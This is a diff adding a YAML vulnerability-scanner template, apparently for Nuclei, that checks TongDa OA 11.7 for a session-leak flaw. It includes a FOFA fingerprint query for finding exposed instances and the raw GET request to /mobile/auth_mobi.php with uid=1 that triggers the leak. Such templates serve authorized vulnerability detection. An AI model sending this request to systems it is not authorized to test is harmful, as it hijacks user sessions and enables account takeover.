@@ -1,0 +1,25 @@
+id: tongda-oa-11-7-session-leak
+
+info:
+  name: TongDa OA 11.7 Session Leak
+  author: zp857
+  severity: critical
+  tags: tongda-oa,leak
+  metadata:
+    fofa-query: 'body="Anywhere 2017版" || body="/static/templates/2017_01/" || body="请联系OA软件开发商" || body="tongda" || body="通达"'
+
+requests:
+  - raw:
+      - |
+        GET /mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: dsl
+        dsl:
+          - '!contains(body, "RELOGIN") && status_code==200'
